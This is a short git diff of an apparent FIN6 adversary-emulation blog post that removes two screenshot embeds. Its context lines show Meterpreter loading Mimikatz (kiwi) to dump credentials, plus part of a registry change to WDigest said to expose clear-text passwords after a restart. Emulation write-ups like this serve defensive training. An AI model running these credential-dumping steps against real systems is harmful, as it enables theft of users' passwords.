@@ -297,7 +297,7 @@ Reporting indicates that FIN6 has used Mimikatz on several occasions. While ther
 meterpreter > load kiwi
 meterpreter > creds_all
 ```
-![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_2_Meterpreter_Mimikatz_No_Password.png){:width="100%"}
+
 
 Note the password field is null.
 
@@ -311,7 +311,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
 Once done, restart the victim's server and re-execute the Mimikatz command earlier. You should now able to see the clear-text passwords in memory. 
 
-![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_2_Meterpreter_Mimikatz.png){:width="100%"}
+
 
 FIN6
 
